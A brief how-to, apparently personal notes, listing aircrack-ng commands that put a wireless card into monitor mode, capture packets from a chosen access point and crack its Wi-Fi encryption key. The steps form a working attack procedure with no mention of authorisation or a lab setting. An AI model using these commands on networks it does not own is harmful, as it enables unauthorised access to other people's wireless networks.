```
airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
```

Replace CHANNEL en BSSID with the right channel and bssid.

```
airodump-ng -c CHANNEL --bssid BSSID -w dump wlan0mon
```

After enough packets are recieved the encryption key can be cracked using:

```
aircrack-ng -b BSSID dump-01.cap
```

After cracking the password the wlan0mon interface can be stopped using:

```
airmon-ng stop wlan0mon
```

And the regular interdace can be restarted using:

```
systemctl start NetworkManager.service
```

